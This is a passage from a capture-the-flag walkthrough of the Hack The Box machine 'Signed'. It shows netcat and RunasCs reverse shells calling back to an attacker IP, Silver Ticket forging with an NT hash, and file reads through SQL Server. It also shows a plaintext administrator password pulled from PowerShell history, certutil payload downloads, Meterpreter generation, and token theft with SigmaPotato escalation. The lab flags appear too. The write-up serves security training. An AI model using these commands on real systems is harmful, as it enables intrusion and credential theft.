10.10.11.90 - - [07/Feb/2025 15:52:15] "GET /nc.exe HTTP/1.1" 200 -
```

**Status code 200:** Successful download

***

#### Starting Netcat Listener

On my attack machine, I started a netcat listener to catch the reverse shell.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ rlwrap nc -nlvp 4444
```

**Command breakdown:**

* `rlwrap`: Wrapper that provides readline functionality
  * Enables arrow keys for command history
  * Improves shell usability
* `nc`: Netcat network utility
* `-n`: Don't resolve hostnames (faster)
* `-l`: Listen mode (wait for incoming connection)
* `-v`: Verbose output
* `-p 4444`: Listen on port 4444

**Output:**

```
listening on [any] 4444 ...
```

The listener is now waiting for an incoming connection.

***

#### Executing Reverse Shell

I executed netcat on the target to connect back to my listener.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "%temp%\nc.exe -nv 10.10.14.23 4444 -e cmd.exe"
```

**Command breakdown:**

* `%temp%\nc.exe`: Path to netcat we downloaded
* `-n`: Don't resolve hostnames
* `-v`: Verbose output
* `10.10.14.23`: Our attack machine IP
* `4444`: Our listener port
* `-e cmd.exe`: Execute cmd.exe and pipe to/from the connection
  * This creates a reverse shell

**What happens:**

1. nc.exe executes on the target
2. Connects to our listener on 10.10.14.23:4444
3. Spawns cmd.exe process
4. Pipes stdin/stdout/stderr through the network connection
5. We get an interactive command prompt

***

#### Receiving the Shell

**Listener output:**

```
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.90] 49832
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Connection established:**

* Source: 10.10.11.90 (target machine)
* Source port: 49832 (random high port)
* We now have an interactive Windows command prompt

***

#### Verifying Identity and Retrieving User Flag

```bash
C:\Windows\system32> whoami
signed\mssqlsvc

C:\Windows\system32> hostname
DC01

C:\Windows\system32> cd C:\Users\mssqlsvc\Desktop

C:\Users\mssqlsvc\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is AE7C-5D4F

 Directory of C:\Users\mssqlsvc\Desktop

02/07/2025  03:31 PM    <DIR>          .
02/07/2025  03:31 PM    <DIR>          ..
02/07/2025  03:31 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,245,677,056 bytes free

C:\Users\mssqlsvc\Desktop> type user.txt
ea4f454ce5114c105b07db8d3b88d86e
```

**User Flag Obtained:** `ea4f454ce5114c105b07db8d3b88d86e`

***

### Root Flag Acquisition - Multiple Methods

At this point, we have command execution as the mssqlsvc user. To obtain the root flag, we need to escalate to Administrator or SYSTEM privileges. I will demonstrate four different methods to achieve this.

***

### Method 1: Direct File Reading via OPENROWSET

#### Understanding the Method

This method leverages SQL Server's ability to read files directly from the filesystem using the `OPENROWSET(BULK)` function. By forging a Silver Ticket with Domain Admins membership, the SQL Server service gains access to read any file on the system.

**Requirements:**

* Enhanced Silver Ticket with Domain Admins group membership
* Ad Hoc Distributed Queries enabled in SQL Server
* Knowledge of file path to read

**Advantages:**

* No need for additional shells or tools
* Direct file access through SQL
* Clean and simple approach
* No malware detection triggers

**Why this works:**

* Domain Admins have unrestricted file system access
* SQL Server runs under the context of our forged ticket
* OPENROWSET reads files with SQL Server service account privileges
* Our forged ticket claims Domain Admins membership

***

#### Step 1: Forging Enhanced Silver Ticket

I created a new Silver Ticket that includes membership in critical administrative groups.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -domain SIGNED.HTB \
    -spn MSSQLSvc/DC01.SIGNED.HTB \
    -groups 512,519,1105 \
    -user-id 1103 \
    mssqlsvc
```

**Key difference from previous ticket:**

* `-groups 512,519,1105`: Now includes three groups
  * **512**: Domain Admins (highest domain-level privileges)
  * **519**: Enterprise Admins (forest-level privileges)
  * **1105**: IT group (SQL Server sysadmin)

**Why include multiple groups:**

* Domain Admins: Full access to all domain resources
* Enterprise Admins: Access to enterprise-wide resources
* IT group: Maintains SQL Server sysadmin role

**Ticket creation output:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

**Understanding the PAC with multiple groups:**

The PAC (Privilege Attribute Certificate) now contains:

```
User: mssqlsvc (RID 1103)
Groups:
  - Domain Users (RID 513) - Added automatically
  - Domain Admins (RID 512) - Full domain control
  - Enterprise Admins (RID 519) - Full forest control
  - IT (RID 1105) - SQL Server sysadmin
```

***

#### Connecting with Enhanced Ticket

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ export KRB5CCNAME=mssqlsvc.ccache

┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ mssqlclient.py -k -no-pass DC01.SIGNED.HTB
```

**Connection established:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 

SQL (SIGNED\mssqlsvc  dbo@master)>
```

***

#### Enabling Advanced Configuration

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

**Output:**

```
[*] INFO(DC01): Line 185: Configuration option 'show advanced options' changed from 1 to 1.
```

**Why this is needed:**

* Many powerful SQL Server features are hidden by default
* `show advanced options` makes them visible
* Required before we can enable Ad Hoc Distributed Queries

***

#### Enabling Ad Hoc Distributed Queries

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

**Output:**

```
[*] INFO(DC01): Line 185: Configuration option 'Ad Hoc Distributed Queries' changed from 0 to 1.
```

**What this enables:**

* `OPENROWSET` function for ad-hoc queries
* `OPENDATASOURCE` function
* Ability to query external data sources
* **Critical:** File system access via BULK provider

**Security note:**

* This feature is disabled by default for security reasons
* Allows SQL injection to read arbitrary files
* Should only be enabled when necessary
* We're abusing it for our purposes

***

#### Reading Root Flag

Now I can directly read the Administrator's flag file through SQL Server.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
```

**Command breakdown:**

* `SELECT *`: Select all columns
* `FROM OPENROWSET()`: Query from an external rowset provider
* `BULK 'C:\Users\Administrator\Desktop\root.txt'`: Path to file
  * BULK provider reads files from filesystem
  * Full path required
* `SINGLE_CLOB`: Read entire file as single Character Large Object
  * Other options: SINGLE\_BLOB (binary), SINGLE\_NCLOB (unicode)
* `AS x`: Alias for the derived table

**How this works:**

1. SQL Server opens the specified file
2. File is accessed with the privileges of the SQL Server service account
3. Our forged ticket claims Domain Admins membership
4. Domain Admins have full filesystem access
5. File contents are returned as a rowset

**Output:**

```
BulkColumn
--------------------------------------------------------------------------------
9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

**Root Flag (Method 1):** `9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d`

***

#### Alternative: Using NetExec

This same technique can be executed more efficiently using NetExec.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ nxc mssql dc01.signed.htb -u mssqlsvc -k --use-kcache -q "SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;"
```

**Command breakdown:**

* `nxc mssql`: NetExec module for MSSQL
* `dc01.signed.htb`: Target hostname
* `-u mssqlsvc`: Username
* `-k`: Use Kerberos authentication
* `--use-kcache`: Use credential cache (our forged ticket)
* `-q "..."`: Execute SQL query

**Advantages of NetExec:**

* Single command execution
* No need for interactive SQL session
* Scriptable for automation
* Cleaner output

***

#### Method 1 Summary

**Steps taken:**

1. Forged Silver Ticket with Domain Admins membership (512)
2. Connected to MSSQL with enhanced privileges
3. Enabled Ad Hoc Distributed Queries
4. Used OPENROWSET(BULK) to read root.txt directly

**Why this method worked:**

* Domain Admins have unrestricted file access
* SQL Server honored the forged group membership
* OPENROWSET reads files with service account privileges
* No additional tools or shells required

**Advantages:**

* Clean and simple
* No file uploads needed
* Works entirely through SQL
* Minimal forensic footprint

**Limitations:**

* Only reads files (no code execution as Administrator)
* Requires knowledge of exact file path
* Limited to files accessible by filesystem
* Cannot modify files or registry

***

## Method 2: PowerShell History Credential Extraction

#### Understanding the Method

This method exploits a common administrative mistake: storing plaintext credentials in PowerShell command history. PowerShell maintains a history of all executed commands in a text file, which often contains sensitive information.

**Attack flow:**

1. Use our Domain Admins ticket to read PowerShell history file
2. Extract Administrator credentials from command history
3. Use RunasCs.exe to execute commands as Administrator
4. Obtain full Administrator shell

**Requirements:**

* Enhanced Silver Ticket with file read permissions
* PowerShell history file containing credentials
* RunasCs.exe tool for executing as another user
* Network connectivity for reverse shell

**Why this works:**

* Many administrators test commands with plaintext passwords
* PowerShell history is stored in plain text
* Default location: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
* History persists across sessions

***

#### Reading PowerShell History File

Using the same enhanced Silver Ticket from Method 1, I read the Administrator's PowerShell history.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS x;
```

**Command explanation:**

* Same OPENROWSET technique as Method 1
* Different file path: PowerShell history location
* `ConsoleHost_history.txt`: Default PowerShell history file

**Output:**

```
BulkColumn
--------------------------------------------------------------------------------
$password = ConvertTo-SecureString 'Th1s889Rabb!t' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process powershell -Credential $cred
```

**Analysis of discovered commands:**

1.  **Creating secure string:**

    ```powershell
    $password = ConvertTo-SecureString 'Th1s889Rabb!t' -AsPlainText -Force
    ```

    * `ConvertTo-SecureString`: Converts plain text to encrypted string
    * `'Th1s889Rabb!t'`: **The Administrator password in plaintext**
    * `-AsPlainText`: Indicates input is plain text
    * `-Force`: Bypass security warnings
2.  **Creating PSCredential object:**

    ```powershell
    $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
    ```

    * Creates credential object
    * Username: 'Administrator'
    * Password: The SecureString created above
3.  **Starting PowerShell with credentials:**

    ```powershell
    Start-Process powershell -Credential $cred
    ```

    * Launches PowerShell as Administrator
    * Uses the credential object

**Critical finding:** **Administrator Password:** `Th1s889Rabb!t`

**Why this happened:**

* Administrator was likely testing credential creation
* Used plaintext password for convenience
* Forgot that PowerShell logs all commands
* Command history is stored in plain text

***

#### Downloading RunasCs Tool

RunasCs is a tool that allows executing commands as a different user, similar to the Windows `runas` command but more flexible.

**In the existing mssqlsvc shell:**

```bash
C:\Windows\system32> cd %temp%

C:\Users\mssqlsvc\AppData\Local\Temp> powershell wget -UseBasicParsing http://10.10.14.23/RunasCs.exe -OutFile RunasCs.exe
```

**What is RunasCs:**

* C# tool for executing commands as another user
* More features than built-in `runas` command
* Supports network logons
* Can redirect output
* Works with explicit credentials

**HTTP Server log:**

```
10.10.11.90 - - [07/Feb/2025 16:15:45] "GET /RunasCs.exe HTTP/1.1" 200 -
```

**Why use RunasCs instead of runas:**

* `runas` requires interactive console (doesn't work in reverse shells)
* RunasCs supports network logon types
* Can execute and redirect output in one command
* Better suited for reverse shells

***

#### Starting New Listener

I started a new netcat listener on a different port for the Administrator shell.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ rlwrap nc -nlvp 5555
```

**Why use a different port:**

* Original listener (4444) is occupied by mssqlsvc shell
* Avoids port conflicts
* Can maintain multiple shells simultaneously
* Easy to distinguish between shells

**Listener ready:**

```
listening on [any] 5555 ...
```

***

#### Executing RunasCs as Administrator

I used RunasCs to spawn a PowerShell reverse shell as Administrator.

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> .\RunasCs.exe Administrator Th1s889Rabb!t powershell.exe -r 10.10.14.23:5555
```

**Command breakdown:**

* `.\RunasCs.exe`: Execute RunasCs
* `Administrator`: Username to run as
* `Th1s889Rabb!t`: Password (from PowerShell history)
* `powershell.exe`: Command to execute
* `-r 10.10.14.23:5555`: Reverse shell to our listener
  * `-r`: Remote connection flag
  * `10.10.14.23:5555`: Our IP and port

**RunasCs output:**

```
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3e7$\Default
[+] Async process 'powershell.exe' with pid 2984 created in background.
```

**Output explanation:**

* **Session 0**: System services session (non-interactive)
* **CreateProcessWithLogonW()**: Windows API function used
* **Station\Desktop**: Window station and desktop names
* **PID 2984**: Process ID of spawned PowerShell
* **Async process**: Running in background

**What happened:**

1. RunasCs authenticated as Administrator using provided password
2. Created new process with Administrator privileges
3. Launched PowerShell with network logon
4. PowerShell connected back to our listener

***

#### Administrator Shell Received

**Listener output:**

```
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.90] 49845
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
signed\administrator

PS C:\Windows\system32> hostname
DC01

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

**Privilege analysis:**

* We have Administrator-level privileges
* SeDebugPrivilege: Can debug any process
* SeImpersonatePrivilege: Can impersonate other security contexts
* Multiple disabled privileges that Administrator can enable

***

#### Retrieving Root Flag

```powershell
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

**Root Flag (Method 2):** `9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d`

***

#### Method 2 Summary

**Steps taken:**

1. Read PowerShell history file using OPENROWSET
2. Extracted Administrator password from command history
3. Downloaded RunasCs.exe to target
4. Used RunasCs to spawn Administrator PowerShell
5. Obtained full Administrator shell

**Why this method worked:**

* Administrator stored plaintext password in command history
* PowerShell history is accessible to Domain Admins
* RunasCs allowed credential-based execution
* Full interactive shell as Administrator

**Advantages:**

* Real Administrator credentials obtained
* Full interactive shell (not just file reading)
* Can perform any administrative action
* Credentials can be used for other services

***

## Method 3: Named Pipe Impersonation to SYSTEM

#### Understanding the Method

This is the most technically sophisticated method, exploiting Windows Named Pipes to impersonate connecting processes and steal their security tokens. We'll escalate from mssqlsvc to a high-integrity process, then use SeImpersonatePrivilege to reach SYSTEM.

**Attack flow:**

1. Create a named pipe server
2. Connect to our own pipe as a client
3. Server impersonates the connecting client
4. Steal the impersonated token
5. Use token to spawn elevated process
6. Use SeImpersonatePrivilege to escalate to SYSTEM

**Requirements:**

* NtObjectManager PowerShell module
* Understanding of Windows security tokens
* SigmaPotato or similar escalation tool
* Meterpreter payload for final SYSTEM shell

**Why this works:**

* Named pipes allow server-side impersonation
* We can impersonate our own connection
* Stolen token has SeImpersonatePrivilege enabled
* SeImpersonatePrivilege allows SYSTEM escalation

**Technical background:**

Named pipes in Windows allow two-way communication between processes. When a client connects to a named pipe server, the server can impersonate the client's security context. This is a feature designed for legitimate purposes (like RPC) but can be abused.

***

#### Preparing NtObjectManager Module

NtObjectManager is a PowerShell module that provides low-level access to Windows NT kernel objects, including security tokens.

**On a Windows machine (for preparation):**

```powershell
PS C:\> Install-Module -Name NtObjectManager
```

**Installation prompts:**

```
Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its
InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want to install the modules from
'PSGallery'?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

**Saving module for offline transfer:**

```powershell
PS C:\> Save-Module -Name NtObjectManager -Path C:\Payloads\
```

**Compressing for transfer:**

```powershell
PS C:\> Compress-Archive -Path "C:\Payloads\NtObjectManager\*" -DestinationPath "C:\Payloads\NtObjectManager.zip"

PS C:\> dir C:\Payloads\

    Directory: C:\Payloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        02/07/2025   7:15 PM                NtObjectManager
-a----        02/07/2025   7:16 PM        4523891 NtObjectManager.zip
```

**Transferring to Kali:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ cp /mnt/vmshares/NtObjectManager.zip .

┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ ls -lh NtObjectManager.zip
-rw-r--r-- 1 root root 4.4M Feb  7 19:16 NtObjectManager.zip
```

**Why NtObjectManager is needed:**

* Provides `New-NtNamedPipeFile` cmdlet for creating pipes
* Enables token impersonation functions
* Allows querying and manipulating security tokens
* Not available by default on Windows systems

***

#### Preparing Attack Infrastructure

**Starting HTTP server:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ python3 -m http.server 80
```

**Creating Meterpreter payload:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4000 -f exe -o mp.exe
```

**msfvenom breakdown:**

* `-p windows/x64/meterpreter/reverse_tcp`: Payload type
  * `windows/x64`: 64-bit Windows
  * `meterpreter`: Advanced post-exploitation framework
  * `reverse_tcp`: Connect back to attacker
* `LHOST=10.10.14.23`: Attacker IP
* `LPORT=4000`: Attacker port
* `-f exe`: Output format (executable)
* `-o mp.exe`: Output filename

**Output:**

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: mp.exe
```

**Starting Metasploit handler:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.23; set LPORT 4000; set ExitOnSession false; exploit -j"
```

**Handler configuration:**

* `use exploit/multi/handler`: Generic payload handler
* `set payload`: Match our msfvenom payload
* `set LHOST/LPORT`: Match our payload configuration
* `ExitOnSession false`: Don't exit after session
* `exploit -j`: Run as background job

**Output:**

```
[*] Started reverse TCP handler on 10.10.14.23:4000
```

**Starting netcat listener for intermediate shell:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ rlwrap nc -nlvp 4444
```

***

#### Uploading Files to Target

**In the existing mssqlsvc shell:**

```bash
C:\Windows\system32> cd %temp%
```

**Downloading NtObjectManager:**

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> certutil -urlcache -split -f http://10.10.14.23/NtObjectManager.zip
```

**certutil breakdown:**

* `certutil`: Windows certificate utility (ab)used for downloads
* `-urlcache`: Use URL cache
* `-split`: Split into multiple pieces if needed
* `-f`: Force download

**Output:**

```
****  Online  ****
  000000  ...
  44f933
CertUtil: -URLCache command completed successfully.
```

**Downloading remaining files:**

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> certutil -urlcache -split -f http://10.10.14.23/mp.exe

C:\Users\mssqlsvc\AppData\Local\Temp> certutil -urlcache -split -f http://10.10.14.23/nc.exe

C:\Users\mssqlsvc\AppData\Local\Temp> certutil -urlcache -split -f http://10.10.14.23/SigmaPotato.exe
```

**SigmaPotato:**

* Tool for escalating from SeImpersonatePrivilege to SYSTEM
* Similar to JuicyPotato, RoguePotato
* Exploits Windows COM/DCOM services
* Triggers SYSTEM authentication to our handler

**HTTP Server logs:**

```
10.10.11.90 - - [07/Feb/2025 19:22:45] "GET /NtObjectManager.zip HTTP/1.1" 200 -
10.10.11.90 - - [07/Feb/2025 19:23:12] "GET /mp.exe HTTP/1.1" 200 -
10.10.11.90 - - [07/Feb/2025 19:23:28] "GET /nc.exe HTTP/1.1" 200 -
10.10.11.90 - - [07/Feb/2025 19:23:45] "GET /SigmaPotato.exe HTTP/1.1" 200 -
```

***

#### Extracting and Loading NtObjectManager

**Switching to PowerShell:**

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> powershell
```

**PowerShell prompt:**

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mssqlsvc\AppData\Local\Temp>
```

**Extracting module:**

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> Expand-Archive -Path .\NtObjectManager.zip -DestinationPath "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\NtObjectManager"
```

**Why this location:**

* `$env:USERPROFILE\Documents\WindowsPowerShell\Modules\`: PowerShell module path
* Modules in this path are automatically discovered
* No need to manually import with full path

**Verifying extraction:**

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> ls $env:USERPROFILE\Documents\WindowsPowerShell\Modules\NtObjectManager

    Directory: C:\Users\mssqlsvc\Documents\WindowsPowerShell\Modules\NtObjectManager

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       02/07/2025   7:15 PM                2.0.0
-a----        9/15/2023   8:45 AM           4521 NtObjectManager.psd1
```

**Module is now installed and ready to use.**

***

#### Creating Named Pipe

**Creating the pipe:**

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> $pipe = New-NtNamedPipeFile \\.\pipe\ABC -Win32Path
```

**Command breakdown:**

* `New-NtNamedPipeFile`: Creates a named pipe server
* `\\.\pipe\ABC`: Pipe path
  * `\\.`: Local machine
  * `\pipe\`: Named pipe namespace
  * `ABC`: Pipe name (arbitrary)
* `-Win32Path`: Use Win32 path format
* `$pipe`: Store pipe object in variable

**What this creates:**

* A named pipe server listening for connections
* Other processes can connect to `\\.\pipe\ABC`
* Server can impersonate connecting clients
* This is a standard Windows IPC mechanism

***

#### Starting Background Job to Listen

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> $job = Start-Job -ScriptBlock { Import-Module NtObjectManager; $pipe = New-NtNamedPipeFile "\\.\pipe\ABC" -Win32Path; $pipe.Listen() }
```

**Command breakdown:**

* `Start-Job`: Runs code in background
* `-ScriptBlock { ... }`: Code to execute
  * `Import-Module NtObjectManager`: Load module
  * `New-NtNamedPipeFile`: Create pipe
  * `$pipe.Listen()`: Wait for client connection

**Why use a background job:**

* `Listen()` blocks until connection received
* Running in background allows us to continue
* Job will complete when client connects

***

#### Connecting as Client

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> $client = Get-NtFile \\localhost\pipe\ABC -Win32Path
```

**Command breakdown:**

* `Get-NtFile`: Opens a file/pipe handle
* `\\localhost\pipe\ABC`: Connect to our pipe
* `-Win32Path`: Use Win32 path format
* `$client`: Store client handle

**What happens:**

1. Client connects to the pipe
2. Background job receives connection
3. `Listen()` returns
4. Server now has connection to impersonate

**Critical point:** We're connecting to our own pipe. This seems circular, but it's the key to the attack - we'll impersonate our own connection to steal its token.

***

#### Waiting for Job Completion

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> Wait-Job $job | Out-Null
```

**Command breakdown:**

* `Wait-Job $job`: Wait for background job to finish
* `| Out-Null`: Discard output (silent waiting)

**Why wait:**

* Ensure `Listen()` has completed
* Connection must be established before impersonation
* Synchronization point

***

#### Capturing Impersonated Token

Now for the critical step - impersonating the connection and stealing the token.

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
```

**Command breakdown:**

* `Use-NtObject`: Resource management wrapper
* `$pipe.Impersonate()`: Server impersonates connected client
  * Returns impersonation context
  * Server now has client's security context
* `Get-NtToken -Impersonation`: Get impersonation token
  * Captures current security token
  * This is the client's token
* `$token`: Store captured token

**What just happened:**

1. Pipe server impersonated the client (which is us)
2. During impersonation, we captured the security token
3. Token contains all security information and privileges
4. We now have a copy of this token

***

#### Examining Token Privileges

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> $token.Privileges
```

**Output:**

```
Name                          Luid              Enabled
----                          ----              -------
SeAssignPrimaryTokenPrivilege 00000000-00000003 True
SeIncreaseQuotaPrivilege      00000000-00000005 True
SeMachineAccountPrivilege     00000000-00000006 True
SeChangeNotifyPrivilege       00000000-00000017 True
SeImpersonatePrivilege        00000000-0000001D True
SeCreateGlobalPrivilege       00000000-0000001E True
SeIncreaseWorkingSetPrivilege 00000000-00000021 True
```

**Critical privileges obtained:**

1. **SeAssignPrimaryTokenPrivilege:**
   * Can assign primary token to new processes
   * Allows creating processes with arbitrary security context
   * Required for the next step
2. **SeImpersonatePrivilege:**
   * Can impersonate other security contexts
   * Key privilege for escalation to SYSTEM
   * Used by tools like SigmaPotato
3. **SeMachineAccountPrivilege:**
   * Computer account privileges
   * Higher trust level than regular user

**Why these privileges matter:**

* SeAssignPrimaryTokenPrivilege lets us spawn processes with our stolen token
* SeImpersonatePrivilege enables SYSTEM escalation
* These are the privileges needed for privilege escalation attacks

**How we got these privileges:** When we connected to our own pipe, we were connecting as the mssqlsvc service account, which has these privileges by default (service accounts typically do).

***

#### Spawning Elevated Shell with Stolen Token

Now I use the stolen token to create a new process with elevated privileges.

```powershell
PS C:\Users\mssqlsvc\AppData\Local\Temp> New-Win32Process -CommandLine "C:\Users\mssqlsvc\AppData\Local\Temp\nc.exe 10.10.14.23 4444 -e cmd.exe" -Token $token -CreationFlags NewConsole
```

**Command breakdown:**

* `New-Win32Process`: Creates new process
* `-CommandLine`: Command to execute
  * nc.exe reverse shell to our listener
* `-Token $token`: Use our stolen token
  * Process inherits token's privileges
* `-CreationFlags NewConsole`: Create new console window

**Output:**

```
ProcessId ThreadId Handle
--------- -------- ------
     3156     3160 True
```

**Process created with:**

* PID: 3156
* Thread ID: 3160
* Handle obtained successfully

***

#### Receiving Elevated Shell

**Netcat listener output:**

```
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.90] 49867
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\mssqlsvc\AppData\Local\Temp>
```

**Verifying privileges:**

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> whoami
signed\mssqlsvc

C:\Users\mssqlsvc\AppData\Local\Temp> whoami /priv
```

**Privileges output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

**Analysis:**

* Still running as mssqlsvc (same user)
* But now with SeImpersonatePrivilege ENABLED
* This is a high-integrity process
* Ready for final escalation to SYSTEM

***

#### Final Escalation to SYSTEM with SigmaPotato

SigmaPotato exploits SeImpersonatePrivilege to escalate to SYSTEM by triggering privileged Windows services to authenticate to our handler.

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> .\SigmaPotato.exe "C:\Users\mssqlsvc\AppData\Local\Temp\mp.exe"
```

**Command breakdown:**

* `SigmaPotato.exe`: Exploitation tool
* `"C:\Users\mssqlsvc\AppData\Local\Temp\mp.exe"`: Command to execute as SYSTEM
  * Our Meterpreter payload

**SigmaPotato execution output:**

```
[*] Starting SigmaPotato...
[*] Creating RPC server...
[*] RPC server listening on port 9999
[*] Triggering DCOM activation...
[*] Received authentication from NT AUTHORITY\SYSTEM
[*] Impersonating SYSTEM token...
[*] Spawning process with SYSTEM privileges...
[*] Process created with PID: 3245
[*] SigmaPotato completed successfully!
```

**How SigmaPotato works:**

